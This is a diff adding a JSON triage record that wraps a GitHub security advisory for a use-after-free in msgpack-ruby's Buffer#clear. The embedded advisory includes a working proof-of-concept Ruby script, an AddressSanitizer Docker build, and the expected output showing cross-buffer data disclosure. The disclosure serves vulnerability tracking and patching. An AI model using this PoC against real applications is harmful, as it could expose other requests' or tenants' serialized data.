@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/47360190?v=4\", \"events_url\": \"https://api.github.com/users/pranjalithakur/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/pranjalithakur/followers\", \"following_url\": \"https://api.github.com/users/pranjalithakur/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/pranjalithakur/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/pranjalithakur\", \"id\": 47360190, \"login\": \"pranjalithakur\", \"node_id\": \"MDQ6VXNlcjQ3MzYwMTkw\", \"organizations_url\": \"https://api.github.com/users/pranjalithakur/orgs\", \"received_events_url\": \"https://api.github.com/users/pranjalithakur/received_events\", \"repos_url\": \"https://api.github.com/users/pranjalithakur/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/pranjalithakur/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/pranjalithakur/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/pranjalithakur\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-54522\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 2.1, \"vector_string\": \"CVSS:4.0/AV:L/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-416\", \"name\": \"Use After Free\"}], \"description\": \"### Summary\\n`MessagePack::Buffer#clear` shifts out every chunk and returns its 4 KiB rmem page to the shared pool, but does not reset the buffer's rmem cursor (`rmem_last`, `rmem_end`, `rmem_owner`). The next write sees \\\"unused rmem space\\\" left over from the freed page and hands back a slice of memory that has already been returned to the pool. A second `MessagePack::Buffer` then re-acquires that same page, so reading the cleared-and-rewritten buffer discloses the second buffer's bytes — a same-process use-after-free with cross-buffer information disclosure (and the symmetric write-corruption).\\n\\n### Details\\n- `msgpack_buffer_clear()` → `_msgpack_buffer_shift_chunk()` (`ext/msgpack/buffer.c:151`, `:128`) destroys chunks (`_msgpack_buffer_chunk_destroy`, `:58`, returns the page via `msgpack_rmem_free`) but resets only `tail_buffer_end`/`read_buffer`, leaving `rmem_last`/`rmem_end`/`rmem_owner` pointing into the freed page.\\n- Next `Buffer#write` → `_msgpack_buffer_chunk_malloc()` reuse branch (`:363`) returns `b->rmem_last`, a pointer into the already-freed page.\\n- A second buffer's first write calls `msgpack_rmem_alloc()` and gets the same physical page back from the pool → the two buffers alias the same memory.\\n- Sanitizer note: rmem (`ext/msgpack/rmem.h`) recycles pages with a slab bitmask, not `free()`, so a stock ASAN build does not abort; the cross-buffer disclosure below is the proof.\\n\\n### PoC\\nSingle self-contained script (builds msgpack from rubygems with AddressSanitizer, then runs the PoC):\\n\\n```bash\\nset -e\\nWORK=\\\"$(mktemp -d)\\\"; cd \\\"$WORK\\\"\\n\\n# 1) PoC\\ncat > poc.rb <<'RUBY'\\nb1 = MessagePack::Buffer.new(nil, write_reference_threshold: 256)\\nb1.write('M' * 1000); b1.write('A' * 200); b1.write('N' * 1000)\\nb1.clear\\nb1.write('C' * 128)\\nsecret = ('s' * 200) + ('ABCD' * 32) + ('t' * 400)\\nb2 = MessagePack::Buffer.new(nil, write_reference_threshold: 4096)\\nb2.write(secret)\\nleaked = b1.read_all\\ndonor  = b2.read_all\\nputs 'b1_first64:' + leaked.byteslice(0, 64)\\nputs 'b2_donor64:' + donor.byteslice(200, 64)\\nputs 'leaked_is_C:' + (leaked == 'C' * 128).to_s\\nputs 'cross_buffer_match:' + (leaked == donor.byteslice(200, 128)).to_s\\nRUBY\\n\\n# 2) ASAN build of msgpackfrom rubygems\\ncat > Dockerfile <<'DOCKER'\\nFROM ruby:3.3-bookworm\\nRUN apt-get update && apt-get install -y --no-install-recommends build-essential libasan8 && rm -rf /var/lib/apt/lists/*\\nRUN gem fetch msgpack -v 1.8.1 && gem unpack msgpack-1.8.1.gem && \\\\\\n    cd msgpack-1.8.1/ext/msgpack && \\\\\\n    MSGPACK_DEBUG=1 ruby extconf.rb --with-cflags='-O0 -g -fsanitize=address -fno-omit-frame-pointer' --with-ldflags='-fsanitize=address' && \\\\\\n    make -j\\\"$(nproc)\\\" && cp msgpack.so ../../lib/msgpack/msgpack.so\\nDOCKER\\ndocker build -t msgpack-asan-poc .\\n\\n# 3) Run under ASAN\\ndocker run --rm -v \\\"$WORK/poc.rb:/poc.rb:ro\\\" msgpack-asan-poc \\\\\\n  bash -c 'export LD_PRELOAD=$(gcc -print-file-name=libasan.so); export ASAN_OPTIONS=detect_leaks=0:halt_on_error=1:abort_on_error=1; RUBYLIB=/msgpack-1.8.1/lib ruby -rmsgpack /poc.rb'\\n```\\n\\nExpected output:\\n```\\nb1_first64:ABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCD\\nb2_donor64:ABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCD\\nleaked_is_C:false\\ncross_buffer_match:true\\n```\\n\\n### Impact\\nSame-process cross-buffer information disclosure and corruption: after `clear` + reuse, one `MessagePack::Buffer` aliases another's memory, leaking or overwriting serialized data that may belong to a different request or tenant. Requires direct use of the `MessagePack::Buffer` API with a `clear`/reuse lifecycle (a supported performance pattern); not reachable from a plain `unpack` byte stream. Real-world severity **Low–Medium**; clear memory-safety defect with a small, localized fix.\\n\\n### Credit\\nPranjali Thakur - depthfirst ([depthfirst.com](<http://depthfirst.com>))\", \"ghsa_id\": \"GHSA-4mrv-5p47-p938\", \"github_reviewed_at\": \"2026-07-30T16:33:12Z\", \"html_url\": \"https://github.com/advisories/GHSA-4mrv-5p47-p938\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-4mrv-5p47-p938\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-54522\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-30T16:33:12Z\", \"references\": [\"https://github.com/msgpack/msgpack-ruby/security/advisories/GHSA-4mrv-5p47-p938\", \"https://github.com/msgpack/msgpack-ruby/commit/5627d71606b565641d2dd501b82aae862f4abe90\", \"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/msgpack/CVE-2026-54522.yml\", \"https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54522\", \"https://github.com/advisories/GHSA-4mrv-5p47-p938\"], \"repository_advisory_url\": \"https://api.github.com/repos/msgpack/msgpack-ruby/security-advisories/GHSA-4mrv-5p47-p938\", \"severity\": \"low\", \"source_code_location\": \"https://github.com/msgpack/msgpack-ruby\", \"summary\": \"MessagePack::Buffer#clear Use-After-Free that Enables Cross-Buffer Disclosure\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-30T16:33:13Z\", \"url\": \"https://api.github.com/advisories/GHSA-4mrv-5p47-p938\", \"vulnerabilities\": [{\"first_patched_version\": \"1.8.2\", \"package\": {\"ecosystem\": \"rubygems\", \"name\": \"msgpack\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.8.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-4mrv-5p47-p938",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "msgpack: <= 1.8.1"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-54522"
+    ],
+    "cvss_score": 2.1,
+    "cvss_vector": "CVSS:4.0/AV:L/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "msgpack"
+    ],
+    "remote": false,
+    "vendor_severity": "low"
+  },
+  "first_seen_at": "2026-07-30T19:38:01.440063Z",
+  "provenance": {
+    "content_sha256": "8d090d23f72da0a281d2e55e3dd6ba6f1bd623c8d9a9b4201eeb41c06f6c87b6",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-30T16:33:12Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-4mrv-5p47-p938",
+  "status": "active",
+  "title": "MessagePack::Buffer#clear Use-After-Free that Enables Cross-Buffer Disclosure",
+  "updated_at": "2026-07-30T16:33:13Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-4mrv-5p47-p938"
+}
